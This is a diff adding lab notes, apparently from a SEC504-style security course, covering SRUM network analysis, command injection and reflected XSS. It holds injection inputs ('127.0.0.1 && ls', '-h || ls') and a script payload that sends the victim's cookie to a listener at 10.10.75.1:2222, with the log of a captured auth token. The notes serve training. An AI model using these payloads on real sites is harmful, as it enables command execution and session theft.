@@ -178,11 +178,40 @@ Location of SRUM data: `C:/Windows/System32/sru/SRUDB.dat`
 
 Some of this information is available from Task Manager
 
+Create an Excel doc from the db, sort the `Network` data by `Bytes Sent` and evaluate the `Application` and `Profile` of the top talkers.
+
 ## 4.4 Command Injection Attack
 
+Check input fields for command injection potential, such as:
+
+![cmd inject1](img/lab4/rook1.PNG)
+
+Test additional operators like `&&` and `||` with arguments before and after to get successful executions.
+
+`&&` requires a valid prior command to run the injection on the right side of the shell separator, as is the case with: `127.0.0.1 && ls`
+
+`||` requires the left side to be invalid, as is the case with: `-h || ls` in this example.
 
 ## 4.5 XSS Attack
 
+Uses the same vulnerable site as before, just the `Search` page.
+
+We can use the Developer Tools to see the output of searching for an input is not filtered --> vulnerable to XSS attack.
+
+Because the site renders content delivered from a crafted URL, this is a *__reflected XSS__* attack.
+
+If the submission was recorded, this would be a *__stored XSS__* vuln.
+
+```bash
+# need a PHP server listening on port 2222 with our payload in the directory
+<script>document.location='http://10.10.75.1:2222/?'+document.cookie;</script>
+
+# Successful execution gives us an auth token we can use with curl to see the admin page
+Listening on http://0.0.0.0:2222
+Document root is /home/sec504/labs/cookiecatcher
+Press Ctrl-C to quit.
+[Fri Jul 15 19:32:51 2022] 172.30.0.45:44446 [200]: /?authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb
+```
 
 ## 4.6 SQL Injection (SQLMap)
 
